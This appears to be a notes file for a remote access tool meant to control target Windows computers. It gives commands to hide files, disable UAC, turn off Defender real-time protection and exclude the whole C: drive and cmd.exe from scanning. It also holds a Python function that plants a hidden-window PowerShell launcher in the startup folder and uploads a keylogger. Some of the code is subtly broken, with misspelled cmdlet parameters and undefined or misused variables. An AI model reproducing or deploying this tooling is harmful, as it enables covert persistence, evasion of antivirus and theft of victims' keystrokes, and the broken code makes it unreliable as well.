This is a Remote access tool [RAT] that provides command and control [C2] of the target computers

## Resources
'''
#show files
attrib -h -s -r FILE
    
#hide file
attrib +h +s +r FILE

#disable uac with powershell
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0


## exclusion path
'''
Set-MpPreference -DisableRealTimeMonitoring true
Add-MpPreference -ExclusionPatch c:\
Add-MpPreference -EsclusionProcess c:\windows\system32\cmd.exe

'''



## keylogger function with scp
'''


# keylogger
def keylogger(address, password, working_directory, startup_directory):
    # set variables
    controller = f"{local_path}/files/controller.cmd"
    keylogger = f"{local_path}/files/keylogger.ps1"
    schedule = f"{local_path}/files/schedule.ps1"
            
    with open(controller.cmd, "w") as f:
        f.write("@echo off")
        f.write("powershell Start-Process powershell.exe -windowstyle hidden \"{working_directory}/\"")
            
    # upload remotely
    remote_upload(address, password, controller, startup_directory) # controller
    remote_upload(address, password, keylogger, working_directory) # keylogger
    remote_upload(address, password, schedule, working_directory) # schedule
    
'''